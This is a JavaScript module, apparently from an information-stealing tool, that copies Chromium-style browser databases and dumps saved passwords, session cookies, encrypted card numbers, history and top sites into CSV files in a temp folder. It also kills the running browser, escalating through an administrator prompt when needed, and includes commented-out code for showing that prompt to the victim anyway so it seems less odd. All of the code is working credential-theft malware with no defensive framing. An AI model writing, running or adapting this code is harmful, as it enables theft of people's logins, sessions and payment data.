const { existsSync, copyFileSync, mkdirSync, writeFileSync, rmSync } = require('fs');
const { join, sep } = require('path');
const { randomFileCreator } = require('../dir');
const psList = () => import('ps-list').then(({ default: psList }) => psList());
const sudo = require('sudo-prompt');
const { tempFolder } = require('../../index');
// const moment = require('moment');
const { addDoubleQuotes } = require('../string');
const sqlite3 = require('sqlite3').verbose();

const filesToDelete = [];
const _ = (name, path, use, filename, database, rows, dbData) => {
  path += join(sep, 'Default', use);
  if (!existsSync(path)) return;

  if (!existsSync(join(tempFolder, 'Browsers', name))) mkdirSync(join(tempFolder, 'Browsers', name));
  const file = join(tempFolder, 'Browsers', name, `${filename}.csv`);
  const data = [];
  const dbFile = randomFileCreator();
  filesToDelete.push(dbFile);
  copyFileSync(path, dbFile);

  const db = new sqlite3.Database(dbFile);
  data.push(rows);
  db.serialize(() => {
    db.each(`SELECT * from ${database}`, (err, row) => {
      if (err) return;
      data.push(dbData(row));

      writeFileSync(file, data.join('\n'));
    });
  });

  db.close();
};

module.exports.passwords = (name, path) => {
  return _(name, path, 'Login Data', 'Logins', 'logins', [
    addDoubleQuotes('origin url'), 'username', 'password', addDoubleQuotes('date created'),
    addDoubleQuotes('date last used'), addDoubleQuotes('date password modified'),
  ], (row) => ([
    addDoubleQuotes(row.origin_url), addDoubleQuotes(row.username_value), row.password_value.toString(), // Buffer
    /*moment(*/row.date_created/*).toISOString()*/,
    /*moment(*/row.date_last_used/*).toISOString()*/,
    /*moment(*/row.date_password_modified/*).toISOString()*/,
  ]));
};

module.exports.history = (name, path) => {
  return _(name, path, 'History', 'History', 'urls', [
    'url', 'title', addDoubleQuotes('visit count'), addDoubleQuotes('typed count'),
    addDoubleQuotes('last visit time'),
  ], (row) => ([
    addDoubleQuotes(row.url), addDoubleQuotes(row.title), row.visit_count,
    row.typed_count,
    /*moment(*/row.last_visit_time/*).toISOString()*/,
  ]));
};

module.exports.creditCards = (name, path) => {
  return _(name, path, 'Web Data', 'Credit Cards', 'credit_cards', [
    'guid', addDoubleQuotes('name on card'), addDoubleQuotes('expiration date'),
    addDoubleQuotes('card number encrypted'),
  ], (row) => ([
    row.guid, addDoubleQuotes(row.name_on_card),
    `${row.expiration_month >= 10 ? row.expiration_month : `0${row.expiration_month}`}/${row.expiration_year}`,
    row.card_number_encrypted?.toString(),
  ]));
};

module.exports.cookies = (name, path) => {
  return _(name, path, join('Network', 'Cookies'), 'Cookies', 'cookies', [
    addDoubleQuotes('creation (utc)'), 'host', 'name', 'value', 'path', addDoubleQuotes('expires (utc)'),
    addDoubleQuotes('is secure'), addDoubleQuotes('is httponly'), addDoubleQuotes('last access (utc)'),
    addDoubleQuotes('has expires'), addDoubleQuotes('is persistent'), 'samesite', 'port',
    addDoubleQuotes('last update (utc)')
  ], (row) => ([
    row.creation_utc, addDoubleQuotes(row.host_key), addDoubleQuotes(row.name), addDoubleQuotes(row.encrypted_value.toString().replaceAll(/[\n\r]/gm, '\\n')),
    row.path, row.expires_utc, row.is_secure, row.is_httponly, row.last_access_utc, row.has_expires,
    row.is_persistent, row.samesite, row.source_port, row.last_update_utc
  ]));
};

module.exports.topSites = (name, path) => {
  return _(name, path, 'Top Sites', 'Top Sites', 'top_sites', [
    'url', addDoubleQuotes('url rank'), 'title'
  ], (row) => ([                     // https://stackoverflow.com/a/17808731/13088041
    addDoubleQuotes(row.url), row.url_rank, addDoubleQuotes(row.title.replaceAll('"', '""'))
  ]));
};

module.exports.kill = (browser, onKilled) => {
  return psList().then(data => {
    const browserProcess = data.find(p => p.name === `${browser}.exe`);
    if (typeof browserProcess !== 'undefined' && 'name' in browserProcess) {
      process.on('uncaughtException', err => {
        // If we can't kill the browser without using administrator rights, we
        // need to use these to get access to the browser database files
        if (err.message === 'kill EPERM') {
          sudo.exec(`taskkill /f /im ${browserProcess?.name}`, {
            name: require('../../config').name
          }, (err) => {
            if (err) return;
            onKilled();
          });
        }
      });
      process.kill(browserProcess.pid);
      onKilled();
    } else {
      // Process does not exist, we don't need to kill it (as it doesn't exist)
      // We just make show the UAC because if it is shown only if the browser is
      // not killed, it will be weird to the user
      // sudo.exec('echo hello', {
      //   name: require('../../config').name
      // }, (err) => {
      //   if (err) return;
      //   onKilled();
      // });
      onKilled();
    }
  });
};

process.on('beforeExit', () => filesToDelete.forEach(file => rmSync(file)));
